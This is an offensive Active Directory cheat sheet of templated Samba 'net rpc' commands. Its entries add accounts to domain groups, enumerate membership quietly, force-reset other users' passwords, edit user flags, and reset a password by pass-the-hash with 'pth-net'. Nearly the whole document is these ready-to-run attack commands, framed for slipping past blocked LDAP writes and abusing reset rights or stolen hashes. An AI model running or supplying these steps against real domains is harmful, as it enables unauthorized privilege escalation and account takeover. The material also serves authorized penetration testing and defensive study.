# Netrpc

## netrpc (Samba RPC / net rpc)

### Add to group

Add Netrpc to group.

Add a member to a domain group via SAMR over RPC. Useful when LDAP write is blocked but SAMR is open.

```sh title:"Netrpc Add to Group"
net rpc group addmem "$group" "$target_user" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var group
var rhost_name
var target_user
-->

### List group members

List group members with Netrpc.

Read group membership over SAMR. Quieter than LDAP for fast peeks.

```sh title:"Netrpc List Group Members"
net rpc group members "$group" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var group
var rhost_name
-->

### List group members (FQDN DC)

List group members (FQDN DC) with Netrpc.

Same membership read, target specified as FQDN. Use when NetBIOS resolution is broken.

```sh title:"Netrpc List Group Members (FQDN DC)"
net rpc group members "$group" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var group
var rhost_name
-->

### Add service account to group

Add service account to group with Netrpc.

Convenience variant for adding a service account into a group. Same primitive, named for clarity.

```sh title:"Netrpc Add Service Account to Group"
net rpc group addmem "$group" "$service_account" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var group
var service_account
var rhost_name
-->

### Change user password

Dump change user password with Netrpc.

Force-set a target user's password via SAMR. Requires Reset Password right.

```sh title:"Netrpc Dump Change User Password"
net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$pass" -S "$domain"
```
<!-- cheat
import users
import passwords
import domain_ip
var target_user
var target_pass
-->

### Change password (alt user)

Dump change password (alt user) with Netrpc.

Same password reset, alternate authenticated user format pointed at a specific DC by name.

```sh title:"Netrpc Dump Change Password (alt User)"
net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var rhost_name
var target_user
var target_pass
-->

### Change password (FQDN DC)

Dump change password (FQDN DC) with Netrpc.

Same password reset, DC referenced by FQDN.

```sh title:"Netrpc Dump Change Password (FQDN DC)"
net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var rhost_name
var target_user
var target_pass
-->

### Edit user

Set edit user with Netrpc.

Open the SAMR-side user editor to flip flags and reset attributes.

```sh title:"Netrpc Set Edit User"
net rpc user edit "$target_user" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var rhost_name
var target_user
-->

### Password change w/hash

Dump password change w/hash with Netrpc.

Pass-the-hash variant of the password reset using `pth-net` (LM:NT format).

```sh title:"Netrpc Dump Password Change W/hash"
pth-net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$hash:$hash" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var hash
var rhost_name
var target_user
var target_pass
-->
